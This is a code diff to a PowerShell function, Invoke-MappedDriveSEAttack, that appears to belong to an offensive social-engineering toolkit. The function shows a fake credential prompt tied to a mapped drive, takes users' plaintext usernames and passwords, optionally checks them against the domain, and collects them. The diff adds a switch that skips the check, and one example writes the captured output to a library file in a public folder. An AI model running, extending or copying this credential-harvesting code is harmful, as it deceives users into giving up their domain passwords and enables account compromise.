@@ -6,7 +6,9 @@ Function Invoke-MappedDriveSEAttack
         [Parameter(Mandatory = $true,Position = 1)]
         [string]$Drive,
         [Parameter(Mandatory = $false,Position = 2)]
-        [int]$retries = 3
+        [int]$retries = 3,
+        [Parameter(Mandatory = $false,Position = 3)]
+        [bool]$verify = $true
 
     )
     <#
@@ -45,6 +47,8 @@ Function Invoke-MappedDriveSEAttack
 
             .Example
             Invoke-MappedDriveSEAttack -drive R -retries = 3
+
+            Invoke-MappedDriveSEAttack -drive R -verify $false
 	
             Invoke-MappedDriveSEAttack -drive T -retries = 3 | Out-File C:\users\public\libraries\tmp.library-ms
     #>
@@ -92,9 +96,10 @@ Function Invoke-MappedDriveSEAttack
 
           
 	$Drive = $Drive + ':\'		
-    $ValidCreds = $false
     $credentials = @()
     $retryCount = 0
+    $ValidCreds = $false
+
     Do
     {
 
@@ -111,10 +116,14 @@ Function Invoke-MappedDriveSEAttack
         $password = $cred.GetNetworkCredential().Password
         $CurrentDomain = $env:UserDomain
         $UserCancel = $cred	
-                
-        $isValid = Test-Credentials -username $username -password $password -domain $UserDefDomain
-                
-								
+        
+        if($verify){  
+            $isValid = Test-Credentials -username $username -password $password -domain $UserDefDomain
+        }
+        else{
+            $isValid = $true
+        }
+				
         if($isValid -eq $false)
         {
             $credentialsTemp = New-Object -TypeName psobject -Property @{
@@ -139,7 +148,7 @@ Function Invoke-MappedDriveSEAttack
                 CredentialDomain = $UserDefDomain
                 Username = $username
                 Password = $password
-                Valid    = $true
+                Valid    = $verify
             }
             $credentials += $credentialsTemp
             $ValidCreds = $true
